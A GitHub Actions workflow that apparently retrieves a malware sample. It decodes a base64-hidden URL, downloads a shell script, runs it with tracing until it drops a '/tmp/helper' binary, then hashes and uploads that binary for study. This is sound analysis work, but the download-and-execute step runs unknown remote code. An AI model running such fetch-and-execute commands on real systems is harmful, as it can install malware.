name: Extract Helper Binary

on:
  workflow_dispatch:

jobs:
  extract:
    runs-on: ubuntu-latest
    timeout-minutes: 10

    steps:
      - name: Decode URL
        run: |
          URL=$(echo "aHR0cHM6Ly9zYXRpbjg3LmNvbS9jdXJsLzY2MjdmMDJhN2EzNzVlZjEyYmUxMzMwMThiZDIyY2Y5MTRmNWFjYWYxMDljODc4NmIwMjk3MGNhZjFhYWU5YWU=" | base64 -d)
          echo "URL=$URL" >> $GITHUB_ENV

      - name: Download script
        run: |
          curl -L "$URL" -o script.sh
          chmod +x script.sh

      - name: Show script
        run: |
          echo "===== SCRIPT ====="
          cat script.sh

      - name: Extract helper URL
        run: |
          grep -aoE 'https://[^"]+' script.sh || true

      - name: Execute until helper downloaded
        continue-on-error: true
        run: |
          timeout 60 bash -x script.sh > runtime.log 2>&1 || true

      - name: Locate helper
        run: |
          ls -lah /tmp || true

          if [ -f /tmp/helper ]; then
            file /tmp/helper > helper-info.txt
            sha256sum /tmp/helper >> helper-info.txt
          else
            echo "helper not found" > helper-info.txt
            exit 1
          fi

      - name: Upload helper binary
        uses: actions/upload-artifact@v4
        with:
          name: helper-binary
          path: |
            /tmp/helper
            helper-info.txt
            runtime.log

      - name: Display helper info
        run: |
          cat helper-info.txt
